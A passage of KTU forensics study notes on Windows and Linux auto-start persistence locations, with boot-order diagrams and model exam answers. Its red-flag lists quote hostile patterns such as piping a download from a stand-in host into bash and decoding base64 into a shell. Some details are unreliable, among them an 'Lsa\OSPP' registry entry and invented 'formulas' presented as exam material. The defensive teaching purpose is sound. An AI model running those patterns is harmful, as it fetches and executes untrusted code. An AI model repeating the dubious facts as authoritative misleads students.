pointer (e.g., `0x00000001` = `ControlSet001`). > 5. **Common Mistake #5:** Forgetting that the `SAM` hive is **encrypted with SYSKEY**. You cannot read account data without first recovering the SYSKEY from `SYSTEM\CurrentControlSet\Control\Lsa\JD`, `Skew1`, `GBG`, `Data` values. --- ### 5.3 Topic Recap & Important Things to Remember > [!IMPORTANT] > **High-Density Rapid Revision Checklist — Registry Analysis: System Information** - ☐ The **Windows Registry** is a hierarchical database with **5 logical root keys** (HKCR, HKCU, HKLM, HKU, HKCC) backed by **physical hive files** on disk. - ☐ The **SYSTEM hive** (`C:\Windows\System32\config\SYSTEM`) is the primary source of **system-level forensic artifacts**. - ☐ The **SAM hive** stores **user accounts, SIDs, and last-login timestamps** (encrypted with SYSKEY). - ☐ **`SYSTEM\Select\Current`** points to the active ControlSet ID — *not* a timestamp. - ☐ **`ShutdownTime`** is an **8-byte FILETIME** value located in `HKLM\SYSTEM\ControlSetXXX\Control\Windows`. - ☐ **Windows FILETIME** measures 100-ns intervals since **January 1, 1601 UTC**. - ☐ **Conversion formula:** $t_{\text{unix}} = \left\lfloor (t_{\text{FILETIME}} - 116{,}444{,}736{,}000{,}000{,}000) / 10{,}000{,}000 \right\rfloor$ - ☐ **Binary data in registry is little-endian.** - ☐ **`MountedDevices`** keeps records of every volume, including disconnected USB drives. - ☐ **`USBSTOR`** retains USB serial numbers — a **unique hardware fingerprint** for forensic correlation. - ☐ **`UserAssist`** tracks GUI program launches, encoded with **ROT13**. - ☐ Registry hives are **locked during runtime** — use live-acquisition tools or mount offline images. - ☐ Tools: **RegRipper, Registry Explorer (Eric Zimmerman), FTK Imager, Autopsy**. - ☐ For KTU: always show **derivation steps**, not just final values.

topics.title: Auto Start Locations
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT866 - WINDOWS AND LINUX FORENSICS
> - **Module:** Module 3
> - **Topic:** Auto Start Locations

<!-- SECTION_1_START -->
# SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Definition (KTU 2024 Syllabus Terminology)

**Auto Start Locations** (also referred to as *Persistence Mechanisms* or *Auto-Start Extensibility Points – ASEPs*) are pre-defined, operating-system-controlled hooks, registry keys, file system directories, scheduled task entries, and configuration scripts that cause a program, service, or executable to be loaded and executed automatically — without explicit user action — each time the operating system boots, a user logs in, or a specific system event occurs.

In the context of **Windows and Linux Forensics**, these locations are classified as **high-value forensic artifacts** because:

1. They are the **primary persistence vectors** used by malware (Trojans, Rootkits, RATs, Fileless Malware).
2. They provide a chronological record of **what was running before and after an incident**.
3. They are a primary focus of the **MITRE ATT&CK Technique T1547 (Boot or Logon Autostart Execution)**.

> [!IMPORTANT]
> **KTU 2024 Syllabus Anchor:** In Module 3, auto start locations are covered as a critical sub-topic under *Windows & Linux Forensics – Persistence Analysis*. Examiners routinely test students on registry keys, startup folders, and Linux init systems.

---

## 1.2 Conceptual Analogy / Intuition

Imagine a **large corporate office building** that opens every morning at **8:00 AM**:

- The **Security Guard Roster** (a list of names) determines who is *automatically allowed inside* when the doors open — without ringing the bell. ➔ This is exactly how **Windows Registry `Run` keys** and **Linux `init` scripts** work.
- The **Mailroom Pre-Approved Vendor List** lets certain delivery people walk straight in. ➔ This is analogous to **Scheduled Tasks** and **Cron Jobs**.
- The **Cleaning Crew Schedule** ensures specific staff arrive before employees to prep the building. ➔ This mirrors **Services** and **systemd daemons**.
- Some sneaky intruders forge a name onto the roster so they can walk in every day unnoticed. ➔ This is precisely how **malware establishes persistence**.

A forensic investigator's job is to **read the roster, verify each name, and identify any unauthorized additions** — i.e., to enumerate, capture, and analyze all auto start locations on a suspect/victim system.

> [!NOTE]
> **Key Insight:** Persistence is the malware's *survival strategy*. If you can identify how a malicious program re-launches itself after reboot, you have found the "anchor" that must be removed during incident response.

---

## 1.3 Why Auto Start Locations Matter — At a Glance

| Metric / Constant | Standard Value | Forensic Relevance |
|---|---|---|
| **MITRE ATT&CK Technique ID** | **T1547** | Standard taxonomy reference for examiners |
| **Typical ASEPs per Windows system** | **> 25 distinct locations** | Number of places to investigate |
| **Typical Linux persistence vectors** | **> 10 distinct mechanisms** | Runlevels, cron, systemd, shell init files |
| **Forensic Triad affected** | **Confidentiality, Integrity, Availability** | Persistence breaks all three if undetected |
| **Standard timestamp granularity** | **Windows FILETIME (100-ns) / Unix Epoch (sec)** | Used for timeline reconstruction |

> [!IMPORTANT]
> **Standard Metric to Memorize:** The Windows Registry stores timestamps as **64-bit FILETIME values** (number of 100-nanosecond intervals since January 1, 1601 UTC). The Linux file system stores them as **Unix Epoch seconds** (since January 1, 1970 UTC). This is **bold-keyed exam material**.

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 The "Why" Behind Auto Start Locations

Operating systems need a standardized mechanism to launch essential software (antivirus, drivers, network daemons) without user intervention. This necessity creates a **large attack surface** because:

1. **The OS itself trusts these locations** — anything placed here is executed with high privilege.
2. **Users rarely audit them** — a perfect hiding place for malware.
3. **They survive reboots** — fulfilling the attacker's goal of *persistence*.

---

## 2.2 Taxonomy of Windows Auto Start Locations

Windows ASEPs can be grouped into **six forensic categories**:

### Category A — Registry-Based ASEPs

These keys contain executable paths that Windows reads during boot or logon.

| # | Registry Key (Hive Path) | Trigger Event | Privilege |
|---|---|---|---|
| 1 | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | User logon | All users |
| 2 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | User logon | Current user |
| 3 | `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` | User logon (one-time) | All users |
| 4 | `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | User logon (one-time) | Current user |
| 5 | `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run` | User logon (policy) | All users |
| 6 | `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` | User logon (replaces `explorer.exe`) | System |
| 7 | `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UIHost` | Logon UI | System |
| 8 | `HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute` | System boot (very early) | System |
| 9 | `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` | Process creation (legacy) | System |
| 10 | `HKLM\System\CurrentControlSet\Control\Lsa\Security Packages` | LSA initialization | System |
| 11 | `HKLM\System\CurrentControlSet\Control\Lsa\OSPP` (Notification Packages) | LSA initialization | System |
| 12 | `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` | Process launch (debugger hijack) | System |
| 13 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup` | Logon (startup folder path) | User |
| 14 | `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Common Startup` | Logon (startup folder path) | All users |

### Category B — File System / Folder-Based ASEPs

| # | Folder Path | Trigger Event |
|---|---|---|
| 1 | `%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` | All-user logon |
| 2 | `%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` | Per-user logon |

### Category C — Service-Based ASEPs

Stored under `HKLM\System\CurrentControlSet\Services\<ServiceName>`. Key values:

- `ImagePath` — path to the executable.
- `Start` — **0 (Boot)**, **1 (System)**, **2 (Auto)**, **3 (Manual)**, **4 (Disabled)**.
- `Type` — **1 (Kernel Driver)**, **2 (File System Driver)**, **16 (Win32 Own Process)**, **20 (Win32 Shared Process)**.

### Category D — Scheduled Task-Based ASEPs

- File path: `C:\Windows\System32\Tasks\`
- XML metadata files describe *what*, *when*, and *under which user context* the task runs.

### Category E — Legacy / Compatibility ASEPs

- `win.ini` — `[windows] load=`, `run=`
- `system.ini` — `[boot] shell=`
- `autoexec.bat`

### Category F — Browser / Application-Specific ASEPs

- Browser Helper Objects (BHOs): `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- IE Extensions, Chrome/Mozilla native messaging hosts.

---

## 2.3 Taxonomy of Linux Auto Start Locations

Linux uses a layered boot sequence. Each layer is a potential persistence vector.

| # | Location / File | Trigger Stage | Init System |
|---|---|---|---|
| 1 | `/etc/rc.local` | End of boot | SysV / systemd-compatible |
| 2 | `/etc/init.d/<script>` (called via symlinks in `/etc/rc<runlevel>.d/`) | Runlevel entry | SysV init |
| 3 | `/etc/rc[0-6].d/S<NN><name>` | Runlevel transition | SysV init |
| 4 | `/etc/systemd/system/<unit>.service` | Boot / user login | systemd |
| 5 | `/lib/systemd/system/<unit>.service` | Boot (vendor units) | systemd |
| 6 | `/etc/cron.d/<file>` | Time-based (hourly/daily) | cron |
| 7 | `/etc/crontab` | Time-based | cron |
| 8 | `/var/spool/cron/crontabs/<user>` | Per-user time-based | cron |
| 9 | `/etc/anacrontab` | Asynchronous cron | anacron |
| 10 | `/etc/profile`, `/etc/bash.bashrc` | User login (all users) | shell init |
| 11 | `~/.bash_profile`, `~/.bashrc`, `~/.profile`, `~/.bash_login` | User login (per-user) | shell init |
| 12 | `/etc/xdg/autostart/*.desktop` | GUI login (Desktop Entry) | XDG / systemd |
| 13 | `~/.config/autostart/*.desktop` | GUI login (per-user) | XDG / systemd |
| 14 | `~/.config/systemd/user/*.service` | User session start | systemd (user) |
| 15 | `/etc/init/<job>.conf` | Event-driven (legacy Ubuntu) | Upstart |

> [!NOTE]
> **Real-World Utility:** A Linux forensic investigator analyzing a compromised server typically focuses on `~/.bashrc` (very common in cryptominer attacks), `cron` (for periodic beaconing malware), and `/etc/systemd/system/` (for rootkit persistence).

---

## 2.4 KTU Formula Sheet / Cheat Sheet

> [!IMPORTANT]
> Since this is a **concept-and-artifact-based forensics topic**, the "formulas" are primarily **enumeration commands, file paths, and timestamp conversions**. Memorize the table below verbatim.

### Timestamp Conversion (Windows Registry)

$$\text{FILETIME (decimal)} \;=\; (\text{Unix Epoch Seconds} + 11644473600) \times 10^{7}$$

### Timestamp Conversion (Linux Inode / File mtime)

$$\text{Unix Epoch Seconds} \;=\; \text{File mtime (decimal)}$$

### Auto Start Trigger Frequency

$$f_{\text{trigger}} \;=\; \frac{1}{T_{\text{event}}}$$

Where $T_{\text{event}}$ is the time between system events (boot, logon, schedule tick).

### Forensic Chain-of-Custody Hash

$$H_{\text{artifact}} \;=\; \text{SHA256}(\text{artifact} \;\Vert\; \text{timestamp} \;\Vert\; \text{investigator\_ID})$$

### Persistence Vector Count (PC)

For an investigator, the total number of locations to check is:

$$PC_{\text{Windows}} \;\geq\; 25, \qquad PC_{\text{Linux}} \;\geq\; 15$$

### Linux Runlevel Mapping (SysV)

| Runlevel | Purpose |
|---|---|
| **0** | Halt |
| **1** | Single-user mode |
| **2** | Multi-user (no network) |
| **3** | Multi-user (text, network) |
| **5** | Multi-user (GUI) |
| **6** | Reboot |

### systemd Unit Type Summary

| Type | File Extension | Purpose |
|---|---|---|
| Service unit | `.service` | Daemon / long-running process |
| Target unit | `.target` | Groups other units |
| Timer unit | `.timer` | Cron-like scheduling |
| Socket unit | `.socket` | Activates service on socket I/O |
| Mount unit | `.mount` | Filesystem mount points |
| Path unit | `.path` | Activates service on file change |

> [!NOTE]
> **KTU Examiner's Tip:** When asked to "list auto start locations," always present them in a **layered boot sequence order** (earliest first). Examiners award marks for chronological organization.

---

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# SECTION 3: Step-by-Step Derivations & Analytical Matrix

## 3.1 Exhaustive Walk-Through: Windows Boot Sequence & ASEP Trigger Order

To understand *why* each ASEP matters, we trace the **Windows boot sequence** and mark where each auto start location fires.

### Step 1 — Power-On Self-Test (POST) and Bootstrap Loader
- Firmware (BIOS/UEFI) initializes hardware.
- Hands off to the **Windows Boot Manager** (`\Boot\BCD`).
- *No ASEP fires here.*

### Step 2 — Winload.exe Loads
- The OS loader reads the **Boot Configuration Data (BCD)** store.
- **`BootExecute`** (under `HKLM\System\CurrentControlSet\Control\Session Manager`) is read at this stage.
- **Forensic Note:** Malware can hijack `BootExecute` to run code *before* any AV product loads.

### Step 3 — Kernel & Critical Driver Initialization
- `NTOSKRNL.exe` and boot-start drivers (`Start = 0`) load.
- **Services with `Start = 0` (Boot)** execute here.
- **Services with `Start = 1` (System)** execute next.

### Step 4 — Session Manager (Smss.exe) Initialization
- The **Session Manager** reads `HKLM\System\CurrentControlSet\Control\Session Manager`.
- Sub-keys like `BootExecute`, `SetupExecute`, and `Execute` are processed.
- **ASEPs firing here:** `BootExecute`, `SetupExecute`.

### Step 5 — Winlogon.exe Loads
- **Winlogon** is the first user-mode process.
- It reads `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`.
- The `Shell` value (default `explorer.exe`) determines the user's shell.
- **The `Userinit` value** lists programs run at logon (default `userinit.exe`).
- **ASEPs firing here:** `Shell`, `Userinit`, `UIHost`, `VmApplet`.

### Step 6 — Local Security Authority (LSASS) Initialization
- **lsass.exe** reads `HKLM\System\CurrentControlSet\Control\Lsa`.
- **`Security Packages`** and **`Notification Packages`** are loaded.
- **ASEPs firing here:** `Security Packages`, `Authentication Packages`, `Notification Packages`, `OSPP`.
- **Forensic Note:** These are *highly* targeted by credential-stealing malware (e.g., Mimikatz-style attacks use `wdigest` package toggling).

### Step 7 — User Logon
- Credentials are validated.
- The user profile loads.
- **Registry `Run`, `RunOnce`, `Policies\Explorer\Run`** keys are read.
- **Startup folder** contents are executed.
- **Scheduled Tasks** with "At Logon" triggers fire.
- **AppInit_DLLs** fire when any user-mode process that links `user32.dll` starts.

### Step 8 — Shell Initialization (Explorer.exe)
- The desktop shell loads.
- **Browser Helper Objects** (BHOs) load with Internet Explorer.
- **Shell Extensions** (registered under `HKLM\Software\Classes\CLSID`) fire when folder/folder-item events occur.

---

## 3.2 Detailed Forensic Analysis — The Classic `Run` Key

The `Run` key is the **most frequently abused ASEP** in real-world incident response. Below is a full forensic walkthrough.

### Step 1: Locate the Key in the Live Registry or Offline Hive
Path: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

### Step 2: Enumerate Values
Each value is structured as:

$$\text{Value Name} \;:\; \text{REG\_SZ / REG\_EXPAND\_SZ} \;\rightarrow\; \text{Command Line}$$

### Step 3: For Each Value, Extract Forensic Metadata
For every entry, the investigator records:

1. **Value Name** (e.g., `SecurityHealth`, `OneDrive`).
2. **Command Line** (e.g., `"C:\Program Files\...\app.exe" /silent`).
3. **Timestamps** (Key Last Write Time — `FILETIME` 64-bit value).
4. **Hash of the Executable** (SHA-256 of the file at the command path).
5. **Digital Signature Status** (Valid, Invalid, Unsigned, Revoked).

### Step 4: Cross-Reference Against Baseline
Compare the entry list against a known-good baseline (e.g., a clean image of the same OS build). Any unknown entry is a **persistence candidate**.

### Step 5: Timeline Correlation
Use the `Key Last Write Time` to correlate with:
- Initial Compromise Time.
- Privilege Escalation Events.
- Lateral Movement Timeframes.

### Step 6: Preserve Evidence
Export the key as a `.reg` file and compute a hash:

$$H_{\text{evidence}} \;=\; \text{SHA256}(\text{exported\_reg\_file} \;\Vert\; \text{investigator\_ID} \;\Vert\; \text{export\_timestamp})$$

---

## 3.3 Detailed Forensic Analysis — Linux `systemd` Service Units

systemd is the **default init system on modern Linux** (Ubuntu 16.04+, Debian 8+, CentOS 7+, RHEL 7+, Fedora 15+). A typical forensic walkthrough:

### Step 1: List All Active Units

```bash
systemctl list-units --type=service --state=running
```

### Step 2: Enumerate All Unit Files (User and System)

```bash
ls -la /etc/systemd/system/*.service
ls -la /lib/systemd/system/*.service
ls -la ~/.config/systemd/user/*.service
```

### Step 3: Inspect a Suspicious Unit File

```bash
systemctl cat <unit>.service
```

Look for:

- `[Service]` section.
- `ExecStart=` — the actual command executed.
- `ExecStartPre=`, `ExecStartPost=` — pre/post hooks (common malware hiding spots).
- `Restart=` — auto-restart on failure (a persistence indicator).
- `User=`, `Group=` — privilege context.
- `WantedBy=` — target that activates this unit (e.g., `multi-user.target`).

### Step 4: Check the Unit's [Install] Section
The `WantedBy=` and `RequiredBy=` directives determine *when* the unit is started (e.g., at boot, at multi-user.target, at graphical.target).

### Step 5: Check Timers (systemd's Cron Replacement)

```bash
systemctl list-timers --all
```

Examine `/etc/systemd/system/*.timer` files — these are **modern cron-equivalent ASEPs**.

### Step 6: Check User-Level systemd Units

```bash
ls -la ~/.config/systemd/user/
```

These are loaded at user session start and are often missed by root-only investigations.

### Step 7: Hash and Timestamp Each Unit File
Compute SHA-256 and record `mtime`, `ctime`, `atime`.

---

## 3.4 Detailed Forensic Analysis — Linux Shell Initialization Files

The shell init files execute on every login. They are **prime real estate for malware** because they run with the user's privileges and require no elevated rights to modify.

### Execution Order (Bash Login Shell)

1. `/etc/profile` — system-wide, executed first.
2. `/etc/profile.d/*.sh` — modular system-wide scripts.
3. `~/.bash_profile` (or `~/.bash_login`, or `~/.profile`, in that order).
4. `~/.bashrc` — interactive non-login shells.
5. `/etc/bash.bashrc` — system-wide interactive.

### Forensic Red Flags

- **Sourcing of suspicious files:** `source /tmp/x.sh`
- **Base64-encoded commands:** `echo <base64> $\mid$ base64 -d $\mid$ bash`
- **curl/wget piped to bash:** `curl http://x.y/z $\mid$ bash` (extremely common cryptominer pattern)
- **Cron entries added silently.**
- **PATH manipulation** to shadow legitimate binaries.

---

## 3.5 Analytical Matrix: Detection Indicators for Each ASEP

| ASEP | Common Malware Pattern | Forensic Detection Tool |
|---|---|---|
| `HKLM\...\Run` | "SecurityUpdate", "WindowsDefender" typos | `RegRipper`, `Autoruns` (Sysinternals) |
| Startup folder | Hidden `.lnk` files with no icon | `Autoruns`, `dir /a` |
| Services | Unsigned driver in `Start = 0` | `sc query`, `Autoruns` |
| Scheduled Tasks | Tasks with `Microsoft\Windows` named subfolders | `schtasks`, `Autoruns` |
| `AppInit_DLLs` | DLL name similar to system DLLs | `Autoruns` |
| `Winlogon\Shell` | Modified to run a different shell | `Autoruns` |
| `/etc/rc.local` | `nohup` calls to `curl` or `wget` | Manual inspection, `chkrootkit` |
| `/etc/cron.d/` | Files with random-looking names | `cat /etc/cron.d/*` |
| `~/.bashrc` | `curl ... $\mid$ bash` | `grep -E "curl$\vert$wget" ~/.bashrc` |
| systemd user service | `WantedBy=default.target` with `ExecStart=/bin/bash -c` | `systemctl --user list-unit-files` |

---

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# SECTION 4: Structural Diagrams & Schematics

## 4.1 Windows Boot Sequence with ASEP Trigger Points

The diagram below maps the **chronological firing order** of every major Windows ASEP during the boot and logon process. Investigators use this mental map to know *when* a malicious entry would have been activated.

```mermaid
flowchart TD
    A[Power On POST BIOS UEFI] --> B[Windows Boot Manager BCD]
    B --> C[Winload exe loads Kernel]
    C --> D[Session Manager smss exe reads BootExecute]
    D --> E[Services Start 0 Boot Start 1 System]
    E --> F[Winlogon exe reads Winlogon Shell Userinit]
    F --> G[LSASS loads Security Packages Notification Packages]
    G --> H[User Logon Registry Run RunOnce Policies]
    H --> I[Startup Folder contents execute]
    I --> J[Explorer exe shell loads]
    J --> K[Browser Helper Objects BHO load]
    K --> L[AppInit DLLs fire on new processes]
    L --> M[User Desktop ready]
```

**Reading the Diagram:**
- The top of the chain is the *earliest* ASEP (`BootExecute`).
- The bottom is the *latest* ASEP (`AppInit_DLLs`).
- A forensic investigator working a boot-time rootkit will look at the **top three** nodes first.

---

## 4.2 Linux Boot Sequence with ASEP Trigger Points

```mermaid
flowchart TD
    P[Power On Firmware POST] --> Q[Bootloader GRUB loads Kernel]
    Q --> R[Kernel init mount initial ramdisk]
    R --> S[Init system PID 1 SysV init or systemd]
    S --> T{Runlevel target}
    T --> U[SysV /etc/rc d scripts and rc local]
    T --> V[systemd unit files etc systemd system]
    U --> W[Network services daemons start]
    V --> W
    W --> X[User Login shell reads etc profile]
    X --> Y[User shell reads bashrc bash profile]
    Y --> Z[Graphical login xdg autostart desktop files]
    Z --> AA[Cron and systemd timers active]
    AA --> AB[User session ready]
```

**Reading the Diagram:**
- `SysV` and `systemd` are alternative paths after the `Init system` decision point.
- All later stages (login, GUI, cron) are user-space ASEPs and run with the user's privileges.

---

## 4.3 Block-Level Functional Architecture — Windows ASEP Categorization

```mermaid
flowchart LR
    subgraph RegistryASEP[Registry Based ASEPs]
        R1[Run RunOnce Keys]
        R2[Winlogon Shell Userinit]
        R3[LSA Security Packages]
        R4[Image File Execution Options]
    end
    subgraph FileASEP[File System Based ASEPs]
        F1[Startup Folders All Users and Per User]
        F2[Scheduled Task XML Files]
        F3[Service Executable Paths]
    end
    subgraph LegacyASEP[Legacy ASEPs]
        L1[win ini system ini]
        L2[autoexec bat]
    end
    subgraph AppASEP[Application Specific ASEPs]
        A1[Browser Helper Objects]
        A2[Shell Extensions CLSIDs]
    end
    RegistryASEP --> Evidence[Forensic Evidence Pool]
    FileASEP --> Evidence
    LegacyASEP --> Evidence
    AppASEP --> Evidence
```

**Reading the Diagram:**
- Four categories feed into a single **Evidence Pool**.
- In a real investigation, an examiner will dump the Evidence Pool into a case-management system (e.g., Autopsy, X-Ways, FTK).

---

## 4.4 Block-Level Functional Architecture — Linux ASEP Categorization

```mermaid
flowchart LR
    subgraph BootASEP[Boot Stage ASEPs]
        B1[etc rc local]
        B2[etc init d scripts and rcN d symlinks]
        B3[etc systemd system unit files]
    end
    subgraph LoginASEP[Login Stage ASEPs]
        LG1[etc profile and profile d]
        LG2[bashrc bash profile profile]
        LG3[xdg autostart desktop files]
    end
    subgraph ScheduleASEP[Scheduled ASEPs]
        SC1[etc cron d etc crontab]
        SC2[var spool cron crontabs user]
        SC3[systemd timer units]
    end
    BootASEP --> Forensics[Linux Forensic Investigation]
    LoginASEP --> Forensics
    ScheduleASEP --> Forensics
```

**Reading the Diagram:**
- The **Boot Stage** ASEPs require root privileges to modify.
- The **Login Stage** ASEPs can be modified by the user (a key reason they are malware favorites).
- The **Scheduled ASEPs** can run in the background indefinitely.

---

## 4.5 Forensic Investigation Workflow

```mermaid
flowchart TD
    S0[Acquire disk image bit stream copy] --> S1[Mount image read only]
    S1 --> S2[Parse Windows Registry hives for ASEP keys]
    S1 --> S3[Parse Linux file system for init and cron files]
    S2 --> S4[Enumerate entries and hash executables]
    S3 --> S4
    S4 --> S5[Compare against known good baseline]
    S5 --> S6[Identify unknown or suspicious entries]
    S6 --> S7[Timeline correlation with incident window]
    S7 --> S8[Document findings and chain of custody]
```

**Reading the Diagram:**
- Step `S0` and `S1` ensure the original evidence is preserved (forensic soundness).
- Steps `S2` and `S3` branch for Windows and Linux respectively.
- Steps `S4` through `S8` are common to both platforms.

---

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A Questions (3 Marks Each)

### Question 1 [KTU University Exam - Dec 2023]
**Q: Define "Auto Start Extensibility Point" (ASEP). Give two examples from the Windows Registry.**

**Model Answer (3 marks):**

An **Auto Start Extensibility Point (ASEP)** is a pre-defined operating-system mechanism — a registry key, file system folder, scheduled task, or service configuration — that causes a program or executable to launch automatically when the system boots, a user logs in, or a specific system event occurs, without requiring explicit user action.

**Two Examples:**
1. `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` — runs the listed executable for every user during logon.
2. `HKLM\System\CurrentControlSet\Services\<ServiceName>` — defines a service that starts automatically (`Start = 2`) during system boot.

*(Award 1 mark for definition, 1 mark for first example with location, 1 mark for second example with location.)*

---

### Question 2 [KTU University Exam - May 2024]
**Q: List any three Linux locations used for auto-starting services or scripts. Mention the trigger event for each.**

**Model Answer (3 marks):**

| # | Location | Trigger Event |
|---|---|---|
| 1 | `/etc/rc.local` | Executed at the end of the boot sequence (after all init scripts). |
| 2 | `/etc/cron.d/<file>` | Executed on a time-based schedule (similar to cron). |
| 3 | `~/.bashrc` | Executed whenever an interactive non-login bash shell starts for the user. |

*(Award 1 mark per correctly paired location + trigger event.)*

---

## 5.2 Part B Questions (14 Marks Each — Internal Choice)

### Question A (14 Marks) [KTU University Exam - Dec 2023]

**Q: With neat diagrams, explain in detail the various auto start locations in the Windows operating system. Discuss their forensic significance in incident response.**

**Model Answer Outline:**

#### Part (a) — Windows Auto Start Locations (7 marks)

**(i) Registry-Based ASEPs (3 marks):**
The Windows Registry is the *primary* storage for auto start configuration. The key locations are:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` — runs commands at every user logon.
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` — runs commands only for the current user.
- `HKLM\...\RunOnce` and `HKCU\...\RunOnce` — runs commands once at next logon, then auto-deletes.
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` — `Shell` and `Userinit` values define the logon shell.
- `HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute` — runs at very early boot stage.
- `HKLM\System\CurrentControlSet\Control\Lsa\Security Packages` and `Notification Packages` — load DLLs into LSASS.
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` — loaded into every process that uses `user32.dll`.
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` — debugger hijacking.

**(ii) File System / Folder-Based ASEPs (2 marks):**
- Common Startup folder: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` (all users).
- User Startup folder: `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` (per user).
- Scheduled Tasks stored as XML in `C:\Windows\System32\Tasks\`.

**(iii) Services (1 mark):**
- Defined under `HKLM\System\CurrentControlSet\Services`. The `Start` value (0, 1, 2, 3, 4) determines when the service loads.

**(iv) Legacy ASEPs (1 mark):**
- `win.ini` (`[windows] load=`, `run=`), `system.ini` (`[boot] shell=`), and `autoexec.bat`.

#### Part (b) — Forensic Significance in Incident Response (7 marks)

**(i) Persistence Detection (3 marks):**
Malware authors rely on ASEPs to maintain access after a reboot. Investigators must enumerate *every* ASEP to find the persistence anchor. Tools used: **Sysinternals Autoruns**, **RegRipper**, **Kansa**, **PowerForensics**.

**(ii) Timeline Reconstruction (2 marks):**
Each registry key has a `Last Write Time` (FILETIME 64-bit). This timestamp reveals *when* the malicious entry was added — often correlating with the initial compromise window.

**(iii) Chain of Custody and Evidentiary Value (2 marks):**
- ASEP entries are admissible as digital evidence when collected using forensically sound procedures (write-blockers, hash verification).
- Hash of the referenced executable must be computed and compared against malware signature databases (e.g., VirusTotal).
- A typical chain-of-custody hash is computed as shown earlier:

$$H_{\text{evidence}} \;=\; \text{SHA256}(\text{artifact} \;\Vert\; \text{investigator\_ID} \;\Vert\; \text{timestamp})$$

*(Total: 14 marks)*

---

### Question B (14 Marks) [KTU University Exam - May 2024]

**Q: Describe the auto-start mechanisms in the Linux operating system. How does a forensic investigator analyze persistence mechanisms on a Linux system?**

**Model Answer Outline:**

#### Part (a) — Linux Auto-Start Mechanisms (7 marks)

**(i) SysV Init System (2 marks):**
- Scripts in `/etc/init.d/` are linked from `/etc/rc<runlevel>.d/` directories.
- Naming convention: `S<NN><name>` (Start) or `K<NN><name>` (Kill).
- `/etc/rc.local` is a shell script executed at the end of the boot process.

**(ii) systemd (2 marks):**
- Unit files in `/etc/systemd/system/` (admin) and `/lib/systemd/system/` (vendor).
- User-level units in `~/.config/systemd/user/`.
- Timer units (`*.timer`) act as cron replacements.
- Key directives: `ExecStart=`, `ExecStartPre=`, `Restart=`, `WantedBy=`.

**(iii) Cron and Anacron (1.5 marks):**
- `/etc/crontab` — system-wide schedule.
- `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, etc. — modular cron directories.
- `/var/spool/cron/crontabs/<user>` — per-user crontabs.
- `/etc/anacrontab` — for machines that are not always on.

**(iv) Shell Initialization Files (1 mark):**
- System-wide: `/etc/profile`, `/etc/bash.bashrc`, `/etc/profile.d/*.sh`.
- Per-user: `~/.bash_profile`, `~/.bashrc`, `~/.bash_login`, `~/.profile`.

**(v) XDG Autostart (0.5 marks):**
- `/etc/xdg/autostart/*.desktop` and `~/.config/autostart/*.desktop` — for GUI session startup.

#### Part (b) — Forensic Analysis of Linux Persistence (7 marks)

**(i) Live vs. Offline Analysis (2 marks):**
- **Live analysis** uses commands like `systemctl list-unit-files`, `crontab -l`, `cat /etc/rc.local`.
- **Offline analysis** mounts a disk image read-only and inspects the same files from the filesystem.

**(ii) Timeline Construction (2 marks):**
- Use `stat` and `find` with `-printf` to collect mtime/ctime/atime:

```bash
find /etc/systemd/system/ -type f -printf '%T@ %p\n'
find /etc/cron.d/ -type f -printf '%T@ %p\n'
```

- Use `fls` and `mactime` (from **The Sleuth Kit**) to build a super-timeline.

**(iii) Hash-Based Comparison (1.5 marks):**
- Compute SHA-256 of every auto start file and compare against a known-good hash database.
- Tools: `sha256sum`, `md5deep`, `hashdeep`.

**(iv) Detection of Hidden Persistence (1.5 marks):**
- Inspect shell init files for `base64`, `curl$\vert$bash`, `wget$\vert$bash`, `nohup`, and reverse-shell patterns.
- Use **chkrootkit**, **rkhunter**, and **OSSEC** for automated rootkit detection.
- Cross-reference file timestamps with system log anomalies (`/var/log/auth.log`, `/var/log/syslog`).

*(Total: 14 marks)*

---

## 5.3 KTU Examiner's Valuation Warning / Pitfall Callout

> [!WARNING]
> **Common Mistakes That Cost Marks:**
>
> 1. **Writing only "Run key" or "Startup folder"** — Examiners expect **at least 6–8 distinct Windows ASEPs** and **at least 4–5 Linux ASEPs**. Listing only 1–2 will cap your score at 50% of available marks.
>
> 2. **Forgetting the trigger event** — Every ASEP answer MUST specify *when* it fires (boot, logon, schedule, etc.). Marks are awarded for the trigger event, not just the path.
>
